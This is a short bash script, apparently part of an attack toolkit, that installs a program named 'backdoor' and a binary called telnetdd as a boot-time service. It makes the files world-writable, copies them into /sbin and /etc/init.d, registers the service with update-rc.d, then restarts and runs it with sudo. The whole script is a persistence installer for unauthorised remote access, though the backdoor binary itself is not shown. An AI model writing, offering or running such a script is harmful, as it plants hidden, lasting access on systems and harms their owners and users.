#!/bin/bash
chmod 777 backdoor
chmod 777 telnetcliente
cp telnetdd /sbin
cp telnetdd /etc/init.d/backdoor
update-rc.d backdoor start
update-rc.d backdoor defaults
sudo /etc/init.d/backdoor restart
backdoor
